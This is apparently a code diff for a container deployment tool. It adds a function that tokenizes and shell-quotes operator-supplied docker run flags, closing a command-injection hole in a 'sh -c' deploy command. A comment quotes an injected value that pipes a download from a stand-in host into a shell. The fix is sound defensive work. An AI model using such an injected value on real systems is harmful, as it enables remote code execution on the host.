@@ -187,6 +187,68 @@ function shq(v: string): string {
   return `'${v.replaceAll("'", "'\\''")}'`;
 }
 
+/**
+ * Turn an operator's raw `dockerOptions` string (advanced `docker run` flags) into a shell-SAFE argument
+ * list: split it into shell words (respecting single/double quotes + backslash escapes), then shell-quote
+ * EACH word. Embedded verbatim, `dockerOptions` is a host-root RCE — the deploy command runs under `sh -c`,
+ * so a value like `--name x; curl evil | sh` would execute. After this, that same input becomes literal
+ * argv tokens (`'--name' 'x;' 'curl' 'evil' '|' 'sh'`) that `docker run` rejects as unknown flags — the
+ * shell never re-interprets them. Legitimate flags (`--cap-add=NET_ADMIN --label foo="a b"`) are preserved.
+ * Throws on an unterminated quote (fail closed) so a malformed value fails the deploy instead of splitting
+ * unpredictably. Empty/whitespace/null → "".
+ */
+export function dockerOptionsArgs(raw: string | null | undefined): string {
+  return tokenizeDockerOptions(raw).map(shq).join(" ");
+}
+
+/** Split a raw `dockerOptions` string into shell words (respecting single/double quotes + backslash
+ *  escapes). Returns the raw (un-quoted) tokens — the caller shell-quotes each for {@link dockerOptionsArgs},
+ *  or inspects them for dangerous flags (docker-options-safety). Throws on an unterminated quote. */
+export function tokenizeDockerOptions(raw: string | null | undefined): string[] {
+  if (!raw || !raw.trim()) return [];
+  const tokens: string[] = [];
+  let cur = "";
+  let has = false; // whether the current run is a token (handles empty quoted args like foo="")
+  let inSingle = false;
+  let inDouble = false;
+  for (let i = 0; i < raw.length; i++) {
+    const c = raw[i];
+    if (inSingle) {
+      if (c === "'") inSingle = false;
+      else cur += c;
+      continue;
+    }
+    if (inDouble) {
+      if (c === '"') inDouble = false;
+      else if (c === "\\" && (raw[i + 1] === '"' || raw[i + 1] === "\\")) cur += raw[++i];
+      else cur += c;
+      continue;
+    }
+    if (c === "'") {
+      inSingle = true;
+      has = true;
+    } else if (c === '"') {
+      inDouble = true;
+      has = true;
+    } else if (c === "\\" && i + 1 < raw.length) {
+      cur += raw[++i];
+      has = true;
+    } else if (c === " " || c === "\t" || c === "\n" || c === "\r") {
+      if (has) {
+        tokens.push(cur);
+        cur = "";
+        has = false;
+      }
+    } else {
+      cur += c;
+      has = true;
+    }
+  }
+  if (inSingle || inDouble) throw new Error("dockerOptions has an unterminated quote");
+  if (has) tokens.push(cur);
+  return tokens;
+}
+
 function b64(v: string): string {
   return Buffer.from(v, "utf8").toString("base64");
 }
@@ -553,8 +615,9 @@ function runContainerArgs(app: AppSpec, version: string, name: string): string {
     `--name ${name}`,
     "--restart unless-stopped",
     limitArgs.join(" "),
-    // Operator-supplied raw flags (advanced, passed through verbatim).
-    app.dockerOptions?.trim() || "",
+    // Operator-supplied raw flags (advanced) — tokenized + shell-quoted per word so they can't inject
+    // shell into the `sh -c` deploy command (host-root RCE); see dockerOptionsArgs.
+    dockerOptionsArgs(app.dockerOptions),
     envArg,
     netExpose.trim(),
     volArgs,
